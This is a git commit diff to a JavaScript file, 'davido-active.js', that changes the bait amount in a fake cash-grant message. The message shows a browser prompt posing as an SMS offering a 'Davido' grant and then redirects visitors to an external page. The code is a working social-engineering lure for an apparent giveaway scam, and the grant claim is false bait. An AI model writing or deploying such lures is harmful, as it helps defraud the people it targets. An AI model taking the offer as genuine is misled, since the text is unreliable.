7f90bb3f7e56b012181a76dd8edcf94e44d70c96
bigukpe <bigaka42@gmail.com>
2025-08-08 00:01:19 +0100

    Update davido-active.js

--- davido-active.js
+++ davido-active.js
@@ -1,5 +1,5 @@
-var password = 'WITHDRAW ₦250,000'
-password=prompt('SMS: Congratulations, you are among the selected ones to receive ₦250,000 Business Support Grant from Davido, Press Ok to withdraw cash Now ','WITHDRAW ₦250,000');
-if (password != 'WITHDRAW ₦250,000') {
+var password = 'WITHDRAW ₦55,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive ₦55,000 cash Grant from Davido, Press Ok to withdraw cash Now ','WITHDRAW ₦55,000');
+if (password != 'WITHDRAW ₦55,000') {
 location.href='https://learnlivetech.org/davido.html';
 }
